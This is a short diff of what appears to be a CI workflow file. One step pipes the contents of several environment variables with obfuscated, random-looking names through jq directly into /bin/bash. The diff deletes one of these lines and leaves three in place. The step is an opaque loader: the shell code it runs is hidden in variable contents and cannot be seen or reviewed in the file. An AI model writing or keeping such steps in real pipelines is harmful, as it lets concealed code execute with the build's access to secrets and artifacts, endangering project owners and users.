@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$hfkx63021" | jq -r .l80908 | /bin/bash
           echo $slxva31 | jq -r .qrq68 | /bin/bash
-          echo $joq8379 | jq -r .ii21552 | /bin/bash
           echo $pyq39767 | jq -r .rghsb28 | /bin/bash
 
       - name: Upload archive
